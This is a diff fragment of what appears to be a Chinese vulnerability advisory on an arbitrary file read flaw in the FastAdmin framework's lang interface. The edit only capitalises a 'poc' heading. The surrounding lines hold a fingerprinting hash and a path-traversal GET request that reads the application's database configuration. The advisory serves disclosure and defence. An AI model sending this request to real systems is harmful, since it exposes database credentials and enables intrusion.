@@ -8,7 +8,7 @@ Fastadmin框架 lang接口处存在任意文件读取漏洞，恶意攻击者可
 icon_hash="-1036943727"
 ```
 
-## poc
+## POC
 
 ```
 GET /index/ajax/lang?lang=..//..//application/database HTTP/1.1
